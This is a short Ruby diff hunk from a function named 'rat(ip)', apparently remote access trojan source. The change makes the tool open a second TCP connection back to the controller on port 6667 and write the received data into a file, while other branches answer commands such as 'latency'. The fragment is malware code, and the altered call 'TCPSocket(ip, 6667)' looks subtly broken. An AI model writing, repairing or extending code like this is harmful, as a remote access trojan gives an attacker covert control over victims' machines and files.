@@ -80,9 +80,11 @@ def rat(ip)
         else
           socket.puts 'done'
         end
-        length = socket.gets.to_i
-        content = socket.read length
-        file.write content
+        sock = TCPSocket(ip, 6667)
+        while line = sock.gets
+          file.write line
+        end
+        sock.close
         file.close
       when 'latency'
         socket.puts 'done'
